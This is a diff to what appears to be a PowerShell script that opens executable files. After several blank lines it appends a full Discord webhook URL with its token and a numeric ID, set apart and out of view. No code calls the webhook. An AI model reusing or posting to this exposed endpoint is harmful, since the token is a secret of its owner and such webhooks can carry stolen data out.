@@ -10,3 +10,13 @@ foreach ($exe in $exeFiles) {
         Write-Host "Failed to open $exe" -ForegroundColor Red
     }
 }
+
+
+
+
+
+
+
+
+https://discord.com/api/webhooks/1480337195360456734/2H3PMOWNzXHVe9ieAdGyss1h2-hCrufkaH6d-CIen4CjogjsJtiOmfM5WR_d0jHf_lCV
+1362962788800008242
